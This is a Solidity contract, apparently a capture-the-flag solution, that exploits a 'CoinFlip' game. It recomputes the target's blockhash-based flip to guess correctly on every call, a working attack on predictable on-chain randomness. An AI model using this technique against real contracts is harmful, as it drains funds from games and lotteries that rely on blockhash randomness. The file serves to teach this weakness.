// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "./CoinFlip.sol";
contract Hack {
    
    // this addrress will be our already deployed
    // "CoinFlip" contract
    CoinFlip private immutable target;
    // factor var from "CoinFlip" contract
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

     constructor(address _target) {
        /**
         * @notice we can just call the function we want
         * in "CoinFlip" using "CoinFlip(_target).function(...)"
         * but here we will modify the function to allow us extra
         * checks
         */
        target = CoinFlip(_target);
     }
     
     // our function here will take a "guess"
     // from our own "_guess()" function 
     function flip() external {
        //guess = side ?(true)
        // "flip()" will pass
        // else "flip()" will fail to pass the "require" statement
        //and the transaction will not execute
        bool guess = _guess();
        require(target.flip(guess), "Your Guess failed");
        
     }
     /**
      * @dev function _guess() returns a bool indicating
      * //if our side is true or false
      */
     function _guess() private view returns(bool) {
         uint256 blockValue = uint256(blockhash(block.number - 1));
         uint256 coinFlip = blockValue / FACTOR;
         bool side = coinFlip == 1 ? true : false;
         return side;
     }
}